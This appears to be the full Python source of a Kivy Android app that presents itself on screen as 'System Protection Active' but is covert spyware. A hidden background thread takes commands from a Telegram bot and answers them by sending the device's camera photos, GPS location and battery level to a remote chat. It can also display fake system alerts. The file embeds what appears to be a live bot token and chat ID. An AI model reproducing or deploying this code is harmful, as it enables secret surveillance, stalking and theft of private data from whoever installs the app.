import os
import requests
import time
from threading import Thread
from kivy.app import App
from kivy.uix.label import Label
from plyer import battery, camera, gps, notification

# --- কনফিগারেশন ---
TOKEN = '8290022165:AAG-o11yW7wOgXRille39fd_jXs_mxbz4lE' # তোমার বটের টোকেন এখানে দাও
CHAT_ID = '5602673575'         # তোমার নিজের টেলিগ্রাম আইডি এখানে দাও (যাতে অন্য কেউ কন্ট্রোল না করতে পারে)

class GourabApp(App):
    def build(self):
        return Label(text="System Protection Active\nDo not close this app.")

    def on_start(self):
        # ব্যাকগ্রাউন্ডে কমান্ড চেক করার জন্য থ্রেড চালু করা
        Thread(target=self.check_commands, daemon=True).start()

    def send_to_telegram(self, text):
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': CHAT_ID, 'text': text})

    def send_photo_to_telegram(self, file_path):
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(file_path, 'rb') as photo:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})
        os.remove(file_path)

    def check_commands(self):
        last_update_id = 0
        while True:
            try:
                url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_update_id + 1}"
                response = requests.get(url).json()
                
                if response.get("result"):
                    for update in response["result"]:
                        last_update_id = update["update_id"]
                        if "message" in update:
                            msg = update["message"].get("text", "")
                            
                            if msg == "/start":
                                self.send_to_telegram("System Online!\n/battery\n/photo\n/location\n/msg [text]")
                            
                            elif msg == "/battery":
                                level = battery.status['percentage']
                                self.send_to_telegram(f"Phone Battery: {level}%")
                            
                            elif msg == "/photo":
                                try:
                                    camera.take_picture(filename="snap.jpg", on_complete=self.send_photo_to_telegram)
                                    self.send_to_telegram("Capturing photo...")
                                except:
                                    self.send_to_telegram("Camera Error!")

                            elif msg.startswith("/msg"):
                                popup_text = msg.replace("/msg ", "")
                                notification.notify(title='System Alert', message=popup_text)
                                self.send_to_telegram("Message displayed on phone.")

                            elif msg == "/location":
                                try:
                                    gps.configure(on_location=lambda **kwargs: self.send_to_telegram(f"Loc: https://www.google.com/maps?q={kwargs['lat']},{kwargs['lon']}"))
                                    gps.start()
                                    time.sleep(5)
                                    gps.stop()
                                except:
                                    self.send_to_telegram("GPS is OFF or Error!")
                
                time.sleep(2) # ২ সেকেন্ড পর পর চেক করবে
            except:
                time.sleep(5)

if __name__ == '__main__':

    GourabApp().run()
